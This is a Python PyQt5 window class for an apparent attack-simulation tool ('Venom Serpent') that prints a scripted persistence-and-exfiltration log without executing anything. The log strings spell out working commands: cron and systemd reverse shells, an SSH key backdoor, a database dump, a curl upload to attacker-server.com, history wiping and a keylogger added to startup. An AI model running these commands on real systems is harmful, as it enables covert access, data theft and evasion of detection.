"""
Persistence Step Window
Step 4: Persistence mechanisms and data exfiltration
"""

from PyQt5.QtCore import QTimer
from utils.step_window import BaseStepWindow

class PersistenceWindow(BaseStepWindow):
    """Persistence step window"""
    
    def __init__(self, parent=None):
        super().__init__("persistence", "Persistence & Exfiltration", parent)
        self.setWindowTitle("Venom Serpent - Persistence & Exfiltration")
        self.setFixedSize(1000, 700)
    
    def execute_step(self):
        """Execute persistence step"""
        super().execute_step()
        self.log_output.clear()
        self.simulate_persistence()
    
    def simulate_persistence(self):
        """Simulate persistence activities"""
        target = self.target_info.get('target', '127.0.0.1') if self.target_info else '127.0.0.1'
        
        self.simulate_progress(7000)
        
        self.add_log("🔒 Starting persistence phase...", "system")
        self.add_log(f"🎯 Target: {target} (Compromised system)", "info")
        self.add_log("📡 Establishing persistent access...", "info")
        
        QTimer.singleShot(1000, self.simulate_cron_job)
        QTimer.singleShot(2000, self.simulate_ssh_backdoor)
        QTimer.singleShot(3000, self.simulate_service_installation)
        QTimer.singleShot(4000, self.simulate_data_exfiltration)
        QTimer.singleShot(6000, self.complete_persistence)
    
    def simulate_cron_job(self):
        """Simulate cron job creation"""
        self.add_log("", "info")
        self.add_log("⏰ Creating persistent cron job...", "system")
        self.add_log("Adding reverse shell cron job...", "info")
        self.add_log("Command: echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\"' | crontab -", "warning")
        self.add_log("Response: Cron job added successfully!", "success")
        self.add_log("⚠️  Persistent access established!", "success")
    
    def simulate_ssh_backdoor(self):
        """Simulate SSH backdoor installation"""
        self.add_log("", "info")
        self.add_log("🔑 Installing SSH backdoor...", "system")
        self.add_log("Creating .ssh directory...", "info")
        self.add_log("$ mkdir -p /home/user/.ssh", "info")
        self.add_log("$ chmod 700 /home/user/.ssh", "info")
        self.add_log("Installing public key...", "info")
        self.add_log("$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...' >> /home/user/.ssh/authorized_keys", "warning")
        self.add_log("$ chmod 600 /home/user/.ssh/authorized_keys", "info")
        self.add_log("Response: SSH backdoor installed!", "success")
        self.add_log("⚠️  SSH access established!", "success")
    
    def simulate_service_installation(self):
        """Simulate service installation"""
        self.add_log("", "info")
        self.add_log("🔧 Installing persistent service...", "system")
        self.add_log("Creating systemd service...", "info")
        self.add_log("Service file: /etc/systemd/system/venom.service", "info")
        self.add_log("[Unit]\nDescription=Venom Serpent Service\nAfter=network.target\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/127.0.0.1/4444 0>&1; sleep 30; done'\nRestart=always\n\n[Install]\nWantedBy=multi-user.target", "info")
        self.add_log("Enabling service...", "info")
        self.add_log("$ systemctl enable venom.service", "info")
        self.add_log("$ systemctl start venom.service", "info")
        self.add_log("Response: Service installed and started!", "success")
        self.add_log("⚠️  Persistent service established!", "success")
    
    def simulate_data_exfiltration(self):
        """Simulate data exfiltration"""
        self.add_log("", "info")
        self.add_log("📤 Starting data exfiltration...", "system")
        self.add_log("Searching for sensitive files...", "info")
        self.add_log("$ find / -name '*.txt' -o -name '*.doc' -o -name '*.pdf' 2>/dev/null | head -10", "info")
        self.add_log("/var/www/html/readme.txt", "success")
        self.add_log("/home/user/secret.txt", "success")
        self.add_log("/var/log/auth.log", "success")
        self.add_log("/etc/passwd", "success")
        self.add_log("/var/www/html/config.php", "success")
        
        self.add_log("", "info")
        self.add_log("📄 Extracting sensitive data...", "system")
        self.add_log("Extracting: /home/user/secret.txt", "info")
        self.add_log("Content:", "info")
        self.add_log("┌─────────────────────────────────────────┐", "info")
        self.add_log("│              SECRET.TXT                 │", "info")
        self.add_log("└─────────────────────────────────────────┘", "info")
        self.add_log("Database Credentials:", "warning")
        self.add_log("Username: admin", "success")
        self.add_log("Password: SuperSecretPassword123!", "success")
        self.add_log("Host: localhost", "success")
        self.add_log("Port: 3306", "success")
        self.add_log("Database: target_db", "success")
        self.add_log("──────────────────────────────────────────", "info")
        self.add_log("API Keys:", "warning")
        self.add_log("AWS_ACCESS_KEY: AKIAIOSFODNN7EXAMPLE", "success")
        self.add_log("AWS_SECRET_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "success")
        self.add_log("──────────────────────────────────────────", "info")
        self.add_log("Personal Information:", "warning")
        self.add_log("Name: John Doe", "success")
        self.add_log("Email: john.doe@company.com", "success")
        self.add_log("Phone: +1-555-0123", "success")
        self.add_log("SSN: 123-45-6789", "success")
        
        self.add_log("", "info")
        self.add_log("🗄️  Dumping database...", "system")
        self.add_log("$ mysqldump -u admin -p'SuperSecretPassword123!' target_db > /tmp/database_dump.sql", "warning")
        self.add_log("Response: Database dump completed!", "success")
        self.add_log("File size: 2.5 MB", "info")
        self.add_log("Records: 1,234 users, 5,678 orders, 9,012 products", "info")
        
        self.add_log("", "info")
        self.add_log("📦 Compressing sensitive data...", "system")
        self.add_log("$ tar -czf /tmp/sensitive_data.tar.gz /home/user/secret.txt /tmp/database_dump.sql /var/www/html/config.php", "info")
        self.add_log("Response: Archive created successfully!", "success")
        self.add_log("Archive size: 3.2 MB", "info")
        
        self.add_log("", "info")
        self.add_log("🌐 Exfiltrating data via HTTP...", "system")
        self.add_log("Uploading to: http://attacker-server.com/upload", "info")
        self.add_log("$ curl -X POST -F 'file=@/tmp/sensitive_data.tar.gz' http://attacker-server.com/upload", "warning")
        self.add_log("Response: 200 OK - Data uploaded successfully!", "success")
        self.add_log("⚠️  Data exfiltration completed!", "success")
    
    def complete_persistence(self):
        """Complete persistence step"""
        self.add_log("", "info")
        self.add_log("🧹 Cleaning up local traces...", "system")
        self.add_log("$ rm -f /tmp/database_dump.sql", "info")
        self.add_log("$ rm -f /tmp/sensitive_data.tar.gz", "info")
        self.add_log("$ history -c", "info")
        self.add_log("Response: Local traces cleaned!", "success")
        
        self.add_log("", "info")
        self.add_log("🔄 Setting up additional persistence...", "system")
        self.add_log("Creating hidden directory...", "info")
        self.add_log("$ mkdir -p /var/tmp/.hidden", "info")
        self.add_log("Installing keylogger...", "info")
        self.add_log("$ cp /tmp/keylogger.sh /var/tmp/.hidden/", "info")
        self.add_log("$ chmod +x /var/tmp/.hidden/keylogger.sh", "info")
        self.add_log("Adding to startup...", "info")
        self.add_log("$ echo '/var/tmp/.hidden/keylogger.sh &' >> /etc/rc.local", "warning")
        self.add_log("Response: Additional persistence mechanisms installed!", "success")
        
        self.add_log("", "info")
        self.add_log("✅ Persistence phase completed!", "success")
        self.add_log("📊 Summary: 3 persistence mechanisms installed", "info")
        self.add_log("🎯 Data exfiltrated: 3.2 MB of sensitive data", "success")
        self.add_log("🔑 Access maintained: Cron job, SSH key, systemd service", "success")
        self.add_log("📤 Exfiltration method: HTTP upload to attacker server", "info")
        
        self.step_completed_successfully()
